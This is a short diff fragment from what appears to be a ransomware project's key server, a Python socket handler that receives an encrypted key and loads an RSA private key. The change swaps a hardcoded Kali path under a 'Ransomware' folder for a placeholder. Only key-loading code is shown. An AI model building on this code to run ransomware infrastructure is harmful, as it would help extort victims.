@@ -10,7 +10,7 @@ class ClientHandler(socketserver.BaseRequestHandler):
 	def handle(self):
 		encrypted_key = self.request.recv(1024)
 		
-		with open("/home/kali/Desktop/Ransomware/pub_priv_pair.key", "rb") as key_file:
+		with open("INSERT PRIVATE KEY PATH HERE", "rb") as key_file:
 			private_key = serialization.load_pem_private_key(
 				key_file.read(),
 				backend=default_backend(),
